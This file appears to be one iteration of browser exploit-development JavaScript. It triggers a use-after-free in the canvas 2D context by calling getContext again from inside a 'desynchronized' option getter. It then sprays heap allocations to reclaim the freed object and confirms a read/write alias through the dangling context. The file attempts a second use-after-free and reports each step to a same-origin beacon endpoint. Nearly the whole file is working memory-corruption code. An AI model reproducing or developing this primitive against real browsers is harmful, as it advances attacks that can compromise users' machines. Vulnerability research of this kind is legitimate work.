// p487 — Second UAF with NO beacon inside getter
//
// V486 showed crash during outer getContext. Theories:
//   A) XHR inside getter (STEP-B) disturbs allocator state → C1_2 slot reused
//   B) GC during outer getContext visits dCtx2 → freed C1_2 → crash
//   C) Something in the destructor chain of C1_2 crashes
//
// Test: remove ALL beacons between UAF1-ALIAS and after second UAF trigger.
// If it still crashes → theory B or C (structural, not beacon-induced).
// If it works → theory A (beacon inside getter caused it).
//
// Also test: JUST the first UAF with multiple reads (no second UAF).
//
// Beacon prefix: V487-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();

  function B(tag, body) {
    try {
      var dt = Date.now() - T0;
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V487-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + dt + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // ═══════════════════════════════════════════════════════════
  // TEST 1: First UAF + spray (baseline)
  // ═══════════════════════════════════════════════════════════
  var dCtx1 = null, lCtx1 = null;
  var tc1 = document.createElement('canvas');
  tc1.width = 10; tc1.height = 10;
  document.body.appendChild(tc1);
  var cc1 = 0, s1 = {};
  Object.defineProperty(s1, 'desynchronized', {
    get: function() { cc1++; if (cc1 === 1) dCtx1 = tc1.getContext('2d'); return false; }
  });
  lCtx1 = tc1.getContext('2d', s1);

  if (!dCtx1) { B('ABORT', 'uaf1-fail'); return; }

  var sprayC1 = [], sprayX1 = [];
  for (var i = 0; i < 200; i++) {
    var c = document.createElement('canvas');
    c.width = 10; c.height = 10;
    sprayC1.push(c);
    var ctx = c.getContext('2d');
    ctx.lineWidth = 100 + i;
    sprayX1.push(ctx);
  }

  var lw1 = dCtx1.lineWidth;
  if (typeof lw1 !== 'number' || lw1 < 100 || lw1 >= 300) {
    B('UAF1-MISS', 'lw=' + lw1); return;
  }
  var idx1 = Math.round(lw1 - 100);
  B('UAF1-ALIAS', 'idx=' + idx1);

  // ═══════════════════════════════════════════════════════════
  // TEST 2: Read dCtx1 multiple times to confirm stability
  // ═══════════════════════════════════════════════════════════
  var reads = [];
  for (var r = 0; r < 5; r++) {
    reads.push(dCtx1.lineWidth);
  }
  B('MULTI-READ', reads.join(','));

  // Write through spray, read through dangling
  sprayX1[idx1].lineWidth = 77.5;
  var check1 = dCtx1.lineWidth;
  B('WRITE-READ', 'wrote=77.5,read=' + check1 + ',ok=' + (check1 === 77.5));

  // Restore
  sprayX1[idx1].lineWidth = 100 + idx1;

  // ═══════════════════════════════════════════════════════════
  // TEST 3: Create canvases + contexts WITHOUT a UAF (stress test)
  // ═══════════════════════════════════════════════════════════
  B('PRE-STRESS', 'creating 50 more canvases');
  var extraC = [], extraX = [];
  for (var i = 0; i < 50; i++) {
    var c = document.createElement('canvas');
    c.width = 10; c.height = 10;
    document.body.appendChild(c);
    extraC.push(c);
    var ctx = c.getContext('2d');
    ctx.lineWidth = 900 + i;
    extraX.push(ctx);
  }
  B('POST-STRESS', 'created 50 canvases, still alive');

  // Read dCtx1 again after stress
  var check2 = dCtx1.lineWidth;
  B('POST-STRESS-READ', 'lw=' + check2 + ',expected=' + (100 + idx1));

  // ═══════════════════════════════════════════════════════════
  // TEST 4: Second UAF with ZERO beacons between
  // No beacon inside the getter. No beacon between trigger and reads.
  // Everything stored in vars, flushed at the end.
  // ═══════════════════════════════════════════════════════════
  B('PRE-UAF2', 'about to trigger second UAF');

  var dCtx2 = null, lCtx2 = null;
  var tc2 = document.createElement('canvas');
  tc2.width = 10; tc2.height = 10;
  document.body.appendChild(tc2);

  var cc2 = 0, s2 = {};
  Object.defineProperty(s2, 'desynchronized', {
    get: function() {
      cc2++;
      if (cc2 === 1) {
        dCtx2 = tc2.getContext('2d');
        // NO BEACON HERE — zero side effects in the getter
      }
      return false;
    }
  });

  // Pre-allocate ALL result vars
  var uaf2_got_ctx = false;
  var uaf2_lw = -999;
  var uaf2_ga = -999;
  var uaf2_err = '';

  // TRIGGER — zero beacons between trigger and reads
  lCtx2 = tc2.getContext('2d', s2);

  // Immediate reads — zero allocations
  if (dCtx2) {
    uaf2_got_ctx = true;
    uaf2_lw = dCtx2.lineWidth;
    uaf2_ga = dCtx2.globalAlpha;
  } else {
    uaf2_err = 'no-ctx';
  }

  // NOW send all results
  B('UAF2-RESULT', 'ctx=' + uaf2_got_ctx + ',lw=' + uaf2_lw + ',ga=' + uaf2_ga + ',err=' + uaf2_err);

  // Spray into second UAF slot
  var sprayC2 = [], sprayX2 = [];
  for (var i = 0; i < 200; i++) {
    var c = document.createElement('canvas');
    c.width = 10; c.height = 10;
    sprayC2.push(c);
    var ctx = c.getContext('2d');
    ctx.lineWidth = 500 + i;
    sprayX2.push(ctx);
  }

  if (uaf2_got_ctx) {
    var lw2 = dCtx2.lineWidth;
    if (lw2 >= 500 && lw2 < 700) {
      var idx2 = Math.round(lw2 - 500);
      B('UAF2-ALIAS', 'idx=' + idx2 + ',prev_lw=' + uaf2_lw);

      // Bidirectional write test
      dCtx2.lineWidth = 999.25;
      var bidir = sprayX2[idx2].lineWidth;
      B('UAF2-BIDIR', 'wrote=999.25,read=' + bidir + ',ok=' + (bidir === 999.25));
    } else {
      B('UAF2-NOSPRAY', 'lw=' + lw2 + ',prev_lw=' + uaf2_lw);
    }
  }

  // Final: re-check UAF1 still works
  var lw1_final = dCtx1.lineWidth;
  B('FINAL-CHECK', 'uaf1_lw=' + lw1_final + ',expected=' + (100 + idx1));

  B('DONE', 'all tests completed');

  // Auto-refresh after 8s
  setTimeout(function() { location.reload(); }, 8000);
})();
